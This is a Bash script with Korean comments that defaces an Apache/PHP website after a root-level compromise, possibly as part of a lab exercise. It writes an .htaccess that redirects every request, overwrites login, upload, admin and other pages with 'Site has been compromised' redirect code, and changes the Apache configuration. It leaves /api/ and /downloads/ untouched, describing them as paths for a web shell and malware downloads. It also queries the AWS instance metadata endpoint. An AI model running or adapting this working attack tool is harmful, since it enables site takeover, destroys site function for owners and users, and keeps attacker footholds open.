#!/bin/bash
###############################################################################
# 모든 페이지 변조 스크립트
# 모든 PHP 페이지를 해킹 페이지로 리다이렉트
###############################################################################

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   모든 페이지 변조 - 완전한 사이트 장악                  ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 루트 권한 확인
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[-] root 권한이 필요합니다${NC}"
    exit 1
fi

WEB_ROOT="/var/www/html/www"

echo -e "${YELLOW}[1] 모든 PHP 파일 백업 중...${NC}"

# 기존 PHP 파일들 백업
find "$WEB_ROOT" -name "*.php" -type f ! -name "*.backup.php" | while read file; do
    if [ ! -f "${file}.backup" ]; then
        cp "$file" "${file}.backup"
        echo "  [+] 백업: $file"
    fi
done

echo -e "${GREEN}[+] 백업 완료${NC}"
echo ""

echo -e "${YELLOW}[2] .htaccess로 모든 요청 리다이렉트 설정 중...${NC}"

# .htaccess 생성 (모든 요청을 index.php로)
cat > "$WEB_ROOT/.htaccess" << 'EOFHTACCESS'
# 해킹된 서버 - 모든 페이지 리다이렉트
RewriteEngine On

# API와 다운로드는 제외 (웹쉘과 악성코드용)
RewriteCond %{REQUEST_URI} !^/api/
RewriteCond %{REQUEST_URI} !^/downloads/

# 모든 요청을 index.php로 리다이렉트
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^ /index.php [L]

# 특정 PHP 파일도 강제 리다이렉트
RewriteRule ^login\.php$ /index.php [L]
RewriteRule ^upload\.php$ /index.php [L]
RewriteRule ^register\.php$ /index.php [L]
RewriteRule ^dashboard\.php$ /index.php [L]
RewriteRule ^admin\.php$ /index.php [L]
EOFHTACCESS

chown apache:apache "$WEB_ROOT/.htaccess"
chmod 644 "$WEB_ROOT/.htaccess"

echo -e "${GREEN}[+] .htaccess 설정 완료${NC}"
echo ""

echo -e "${YELLOW}[3] 주요 PHP 파일들을 리다이렉트 코드로 교체 중...${NC}"

# 리다이렉트 PHP 코드
REDIRECT_CODE='<?php
// Site has been compromised - Redirect to main page
header("Location: /index.php");
exit;
?>'

# 주요 PHP 파일들 교체
for php_file in login.php upload.php register.php dashboard.php admin.php profile.php settings.php; do
    if [ -f "$WEB_ROOT/$php_file" ]; then
        echo "$REDIRECT_CODE" > "$WEB_ROOT/$php_file"
        chown apache:apache "$WEB_ROOT/$php_file"
        chmod 644 "$WEB_ROOT/$php_file"
        echo "  [+] 변조: $php_file"
    fi
done

echo -e "${GREEN}[+] PHP 파일 변조 완료${NC}"
echo ""

echo -e "${YELLOW}[4] 모든 서브디렉터리에도 리다이렉트 index.php 추가 중...${NC}"

# 모든 디렉터리에 리다이렉트 index.php 추가
find "$WEB_ROOT" -type d ! -path "$WEB_ROOT/api*" ! -path "$WEB_ROOT/downloads*" | while read dir; do
    if [ "$dir" != "$WEB_ROOT" ] && [ ! -f "$dir/index.php.backup" ]; then
        echo "$REDIRECT_CODE" > "$dir/index.php"
        chown apache:apache "$dir/index.php"
        chmod 644 "$dir/index.php"
        echo "  [+] 추가: $dir/index.php"
    fi
done

echo -e "${GREEN}[+] 서브디렉터리 처리 완료${NC}"
echo ""

echo -e "${YELLOW}[5] Apache 설정 확인 중...${NC}"

# mod_rewrite 활성화 확인
if ! httpd -M 2>/dev/null | grep -q rewrite_module; then
    echo -e "${YELLOW}[*] mod_rewrite 활성화 중...${NC}"
    # Amazon Linux / CentOS
    if [ -f /etc/httpd/conf.modules.d/00-base.conf ]; then
        if ! grep -q "LoadModule rewrite_module" /etc/httpd/conf.modules.d/00-base.conf; then
            echo "LoadModule rewrite_module modules/mod_rewrite.so" >> /etc/httpd/conf.modules.d/00-base.conf
        fi
    fi
fi

# AllowOverride 설정 확인
if ! grep -q "AllowOverride All" /etc/httpd/conf/httpd.conf; then
    echo -e "${YELLOW}[*] AllowOverride All 설정 중...${NC}"
    sed -i '/<Directory "\/var\/www\/html">/,/<\/Directory>/s/AllowOverride None/AllowOverride All/' /etc/httpd/conf/httpd.conf
fi

echo -e "${GREEN}[+] Apache 설정 완료${NC}"
echo ""

echo -e "${YELLOW}[6] Apache 재시작 중...${NC}"
systemctl restart httpd
sleep 2

if systemctl is-active --quiet httpd; then
    echo -e "${GREEN}[+] Apache 재시작 성공${NC}"
else
    echo -e "${RED}[-] Apache 재시작 실패${NC}"
    systemctl status httpd
fi

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║   ✅ 모든 페이지 변조 완료!                               ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo -e "${GREEN}[+] 이제 모든 URL이 해킹 페이지로 리다이렉트됩니다:${NC}"
echo "    • http://$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)/"
echo "    • http://$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)/login.php"
echo "    • http://$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)/upload.php"
echo "    • http://$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)/admin.php"
echo "    • 모든 다른 페이지..."
echo ""
echo -e "${YELLOW}[*] 제외된 경로 (웹쉘과 악성코드용):${NC}"
echo "    • /api/* (웹쉘)"
echo "    • /downloads/* (자동 다운로드)"
echo ""
echo -e "${YELLOW}[*] 원본 복구 방법:${NC}"
echo "    1. 백업 파일 복구:"
echo "       find /var/www/html/www -name '*.backup' -exec bash -c 'mv \"\$0\" \"\${0%.backup}\"' {} \;"
echo "    2. .htaccess 삭제:"
echo "       sudo rm /var/www/html/www/.htaccess"
echo "    3. Apache 재시작:"
echo "       sudo systemctl restart httpd"
echo ""
